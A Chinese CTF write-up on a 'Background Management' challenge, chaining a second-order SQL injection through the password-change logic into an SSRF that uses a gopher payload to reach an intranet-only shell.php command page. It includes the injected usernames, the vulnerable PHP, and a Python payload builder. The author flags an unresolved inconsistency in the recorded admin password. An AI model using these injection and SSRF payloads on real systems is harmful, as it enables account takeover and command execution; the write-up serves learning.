ailx10说：这篇是我2025年2月写的。Background Management 的线索一开始散在备份和日志里，我先注册、再追密码修改逻辑，发现用户名被拿出来后又拼进 SQL，接着才往管理员和后台链接走。后来遇到只能内网访问的 shell.php，又用 SSRF 和 Gopher 去接。这篇留下了一条比较长的链，也留下了原记录里改密与最终登录口令对不上的地方。它不是每个细节都已经闭环的报告；读时可以顺着源码和请求核对，看看每一步拿到的权限，是否真能支撑下一步。

原题从账号注册及密码修改中分析二次 SQL 注入，并在后台发现服务端请求的线索。

在 `Userinfo.php` 中修改用户密码的 SQL 语句中，存在二次注入

```
$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```

会变成下面这样子，从而修改了 admin 用户的密码

```
$sql = "UPDATE users SET PASSWORD='123' where username='admin'--
```

![](/notes-assets/3120b42cf1e40123a0bd.webp)

- 注册用户 `admin\'--` （这种最后修改密码，二次注入失败了）
- 注册用户 `admin\'#`

![](/notes-assets/5cb344b7a4069856e9c6.webp)

使用 `admin'#` 登录，点击修改密码，将密码从 123 修改成 321

![](/notes-assets/0b41e4a4daa011eaf987.webp)

原文记录先将密码从 123 改为 321，随后又称使用 admin 和 123 登录；两处不一致，实际成功口令需复核，不能自行补全。

```
这个是内网的操作页面，只允许内网人员使用,get_cmd<br /><?php 

   echo 'please get $url';



    $url = $_GET['url'] ?? false; 

    if($url)  

    { 

    $a = preg_match("/gopher/i", $url);

        if ($a==0)

        { 

            

            echo "<br />";

            echo "操作错误，你是我们的内网人员吗";

            exit(); 

            

        } 



            $ch = curl_init(); 

            curl_setopt($ch, CURLOPT_URL, $_GET["url"]); 

            curl_setopt($ch, CURLOPT_HEADER, 0); 

            curl_exec($ch); 

            curl_close($ch); 



     } 



?>

```

原文尝试通过受控的服务端请求访问仅限内网的接口。地址来源限制不能代替接口自身的身份认证和授权。

```
import urllib.parse



payload ="""GET /xinan/public/shell.php?cmd=ls HTTP/1.1

Host: 127.0.0.1



"""



tmp = urllib.parse.quote(payload)

new = tmp.replace('%0A','%0D%0A')

result = 'gopher://127.0.0.1:80/'+'_'+new

result = urllib.parse.quote(result)

print(result)
```
